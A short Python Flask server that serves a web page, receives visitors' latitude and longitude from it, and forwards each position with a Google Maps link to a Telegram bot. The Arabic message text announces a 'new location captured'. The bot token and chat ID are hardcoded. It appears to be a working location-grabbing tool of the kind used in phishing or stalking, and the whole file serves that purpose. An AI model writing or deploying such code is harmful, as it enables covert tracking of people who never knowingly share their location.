from flask import Flask, request, send_from_directory
import requests

app = Flask(__name__)

BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"
CHAT_ID = "7485197107"

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    lat = data.get('lat')
    lon = data.get('lon')

    if lat and lon:
        location_msg = f"📍 تم التقاط موقع جديد:\nLatitude: {lat}\nLongitude: {lon}\nhttps://maps.google.com/?q={lat},{lon}"
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": location_msg}
        )
    return {"status": "received"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
